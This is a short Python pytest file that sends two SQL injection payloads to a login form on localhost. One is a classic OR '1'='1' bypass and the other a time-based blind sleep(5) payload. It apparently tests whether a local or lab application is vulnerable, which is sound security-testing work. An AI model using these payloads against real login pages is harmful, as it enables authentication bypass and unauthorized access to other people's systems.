import pytest
import requests
from bs4 import BeautifulSoup

def test_classic():
    r = requests.post("http://localhost:8080/login", {"username": "admin\' OR \'1\'=\'1", "password": ""}).text
    soup = BeautifulSoup(r, "html.parser")
    text = soup.find_all(text=True)
    temp = ""
    for x in text:
        temp += str(x)
    assert "admin" in temp

def test_blind():
    r = requests.post("http://localhost:8080/login", {"username": "admin\' and sleep(5) --", "password": ""}).text
    soup = BeautifulSoup(r, "html.parser")
    text = soup.find_all(text=True)
    temp = ""
    for x in text:
        temp += str(x)
    assert "Internal Server Error" in temp

if __name__ == "__main__":
    test_classic()
    test_blind()
